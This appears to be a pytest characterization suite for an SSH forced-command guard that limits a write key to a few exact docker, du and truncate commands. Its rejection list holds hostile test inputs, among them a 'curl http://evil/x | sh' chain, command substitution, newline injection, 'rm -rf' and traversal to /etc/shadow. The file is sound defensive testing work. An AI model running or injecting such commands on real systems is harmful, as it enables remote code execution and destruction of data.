"""Characterization tests for the ops-rw forced-command guard — the
safety-critical SSH dispatcher on the write key's authorized_keys line
(ADR-0002 credential split; ADR-0004 Option A gated apply; issue #13).

Narrower than ops-ro-guard by design: the allowlist is only the exact argv
the write tools' apply mode sends — the fresh-state re-verification reads
plus the two write shapes. A general diagnosis read rides the ops-ro key,
never this one.

The real shell script runs in validate-only mode (OPS_RW_GUARD_CHECK=1) so a
decision is asserted without ever executing the underlying command. Skips
where no POSIX sh is available (e.g. a bare Windows dev box); CI runs on
ubuntu where it always executes.
"""

from __future__ import annotations

import os
import shutil
import subprocess
from pathlib import Path

import pytest

_GUARD = Path(__file__).resolve().parent.parent / "ops" / "ops-rw-guard"
_SH = shutil.which("sh")

pytestmark = pytest.mark.skipif(_SH is None, reason="POSIX sh not available")


def _decide(original_command: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        [_SH, str(_GUARD)],
        env={
            "OPS_RW_GUARD_CHECK": "1",
            "SSH_ORIGINAL_COMMAND": original_command,
            "PATH": os.environ.get("PATH", ""),
        },
        capture_output=True,
        text=True,
    )


# The exact apply-mode argv shapes prune_images/rotate_logs send (see
# ops_mcp/tools/prune.py, ops_mcp/tools/rotate.py) — this list is the spec of
# everything the write key may ever run.
ALLOWED = [
    # prune_images apply: fresh-state re-verification reads
    "docker ps -q",
    "docker inspect --format {{.Image}} abc123 def456",
    "docker images --no-trunc --format {{.ID}}::{{.Repository}}::{{.Tag}}::{{.Size}}",
    # rotate_logs apply: fresh-state re-verification reads
    "docker inspect --format {{.LogPath}} ask-wiki-rag",
    "du -b /var/lib/docker/containers/abc/abc-json.log",
    # the two write shapes
    "docker image rm sha256:0a1b2c sha256:3d4e5f",
    "truncate -s 0 /var/lib/docker/containers/abc/abc-json.log",
]

REJECTED = [
    ("", "interactive shell"),
    # chaining / expansion
    ("docker image rm sha256:abc; curl http://evil/x | sh", "metacharacter"),
    ("truncate -s 0 /var/lib/docker/containers/$(reboot).log", "metacharacter"),
    ("docker image rm `id`", "metacharacter"),
    # a second line would ride through `sh -c` past the prefix patterns
    ("docker ps -q\nrm -rf /tmp/x", "control whitespace"),
    ("docker image rm sha256:abc\ttruncate -s 0 /etc/passwd", "control whitespace"),
    ("docker ps -q\rreboot", "control whitespace"),
    # a glob counts as ONE argv word at validation but re-expands when
    # `sh -c` runs it — "exactly one path" must hold at execution too
    ("truncate -s 0 /var/lib/docker/containers/*", "metacharacter"),
    ("du -b /var/lib/docker/containers/??/x.log", "metacharacter"),
    ("docker image rm sha256:[a-f]000", "metacharacter"),
    # read-tool / diagnosis shapes have no business on the write key
    ("docker ps -aq", "allowlist"),
    ("docker logs --tail 200 --timestamps edge", "allowlist"),
    ("df -P /", "allowlist"),
    ("docker system df --format {{.Type}}::{{.TotalCount}}", "allowlist"),
    ("rm -rf /tmp/x", "allowlist"),
    # writes outside the two exact shapes
    ("docker image rm ubuntu:latest", "allowlist"),
    ("docker image rm sha256:abc not-a-digest", "sha256"),
    ("truncate -s 0 /etc/passwd", "allowlist"),
    ("truncate -s 999 /var/lib/docker/containers/abc/abc-json.log", "allowlist"),
    (
        "truncate -s 0 /var/lib/docker/containers/a.log /var/lib/docker/containers/b.log",
        "exactly one",
    ),
    ("truncate -s 0 /var/lib/docker/containers/../../etc/passwd", "traversal"),
    ("du -b /var/lib/docker/containers/x/../../../etc", "traversal"),
    # quote/backslash reconstruct to `..` only after `sh -c` strips them, so
    # they'd sail past the literal `*..*` traversal check as one clean word
    ('truncate -s 0 /var/lib/docker/containers/a/.""./.""./etc/shadow', "quote or backslash"),
    ("truncate -s 0 /var/lib/docker/containers/a/.\\./.\\./etc/shadow", "quote or backslash"),
    ("du -b /var/lib/docker/containers/a/.''./.''./etc/shadow", "quote or backslash"),
    ("du -b /var/lib/docker/containers/a.log /etc/shadow", "exactly one"),
    ("du -sh /", "allowlist"),
    ("docker inspect --format {{.LogPath}} edge extra", "exactly one"),
]


@pytest.mark.parametrize("command", ALLOWED)
def test_guard_allows_exact_apply_argv(command):
    result = _decide(command)
    assert result.returncode == 0, result.stderr
    assert result.stdout.strip() == "ALLOW"


@pytest.mark.parametrize("command,reason", REJECTED)
def test_guard_rejects(command, reason):
    result = _decide(command)
    assert result.returncode != 0
    assert reason in result.stderr
